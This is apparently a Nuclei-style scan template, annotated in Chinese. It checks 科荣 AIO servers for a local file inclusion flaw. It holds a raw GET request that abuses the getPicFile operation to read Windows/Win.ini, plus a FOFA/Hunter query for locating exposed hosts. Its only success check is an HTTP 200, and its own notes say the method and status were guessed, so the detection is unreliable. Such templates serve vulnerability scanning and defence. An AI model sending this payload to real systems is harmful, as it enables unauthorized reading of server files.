  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/df97a60363136acfa94984a13a0350ac

    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: df97a60363136acfa94984a13a0350ac
    fofa: + hunter`app.name="科荣 AIO"`
http:
- raw:
  - 'GET /ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
